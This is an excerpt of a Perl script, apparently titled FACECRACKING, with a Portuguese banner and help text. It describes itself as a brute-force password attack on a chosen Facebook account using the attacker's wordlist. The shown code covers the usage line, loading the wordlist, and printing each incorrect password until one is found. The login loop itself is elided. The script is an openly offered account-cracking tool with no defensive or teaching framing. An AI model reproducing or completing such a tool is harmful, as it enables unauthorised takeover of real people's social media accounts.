...
print "\033[1;31m                     ################### \n";
print "\033[1;31m                     #                 #   \n";
print "\033[1;31m                     # Spirnads Flacks # \n";
print "\033[1;31m                     #                 #   \n";
print "\033[1;31m                     ################### \n\n";
print "\033[1;32m                     Desenvolvedor: BL4CK\n\n";
print "\033[1;33m                                  -FACECRACKING- \n\n";
print "                                  Informacoes:   \n";
print "               O FACECRACKING tem a funcao de fazer ataque brute-force \n";
print "            em um determinado alvo do facebook, com uma wordlist do atacante \n\n\n";

print "\033[1;37m      #ERRO# Use o comando: perl $0 Email ou ID wordlist.txt \n";
...
open (LIST, $wordlist) || die "\n[-] Arquivo $wordlist Inexistente!(A WORDLIST deve estar no mesmo diretorio do FACECRACKING)\n";
...
if (!defined $success)
{
print "\033[1;31m[-] $password -> Senha incorreta \n";
close SSL;
}
else
{
print "\033[1;32m\n########################################################\n";
print "[+] \033[1;32mSenha encontrada: $password\n";
print "\033[1;32m########################################################\n\n";
close SSL;
exit;
}
